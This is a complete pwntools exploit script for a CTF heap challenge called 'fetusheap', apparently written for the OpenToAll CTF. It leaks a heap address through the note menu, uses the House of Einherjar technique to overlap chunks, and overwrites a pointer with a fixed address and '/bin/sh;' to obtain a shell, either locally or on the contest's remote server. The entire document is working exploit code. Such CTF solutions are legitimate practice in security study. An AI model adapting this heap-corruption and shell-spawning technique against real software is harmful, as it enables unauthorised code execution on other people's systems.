from pwn import *
 
LOCAL = True

def create_note(page,size,note):
    target.recvuntil("> ")
    target.sendline("1")
    target.recv(120)
    target.sendline(page)
    target.recv(120)
    target.sendline(size)
    target.recv(50)
    target.sendline(note)


def erase_note(page):
    target.recvuntil("> ")
    target.sendline("2")
    target.recv(120)
    target.sendline(page)

def read_note():
    target.recvuntil("> ")
    target.sendline("3")

def pwn():
    log.info("fetusheap  - OTA - mphx2\n\n")   
    log.info("creating the first note to get the heap leak")
    create_note("1","240","A"*240)
    heap_leak = target.recvuntil("!")
    heap_leak = int(heap_leak[30:39],0)
    
    log.success("heap address retrieved: %#x", heap_leak)
    log.info("applying the house of einherjar technique to overlap a chunk")

    heap_leak = heap_leak - 0x20
 
    create_note("2","120","B"*120)
    erase_note("2")
    create_note("3","240","C"*240)
    create_note("4","120","E"*112+p64(0x1c0))
    create_note("5","256","F"*256)
    erase_note("1")
    erase_note("5")
    erase_note("3")

    log.info("overwriting a binary pointer in the heap")
    create_note("1","688", "/bin/sh;"+"A"*264+p64(0x120)+p64(0x0)+p64(heap_leak)+p64(0x400768))
    log.info("triggering the overwritten pointer")

    read_note()

    log.info("take your shell!")

    target.interactive()
 
def main():
        global target
        if LOCAL:
                target = process("./fetusheap")
                
        else:
                target = remote("university.opentoallctf.com", 7777)
        pwn()
 
if __name__ == "__main__":
    main()
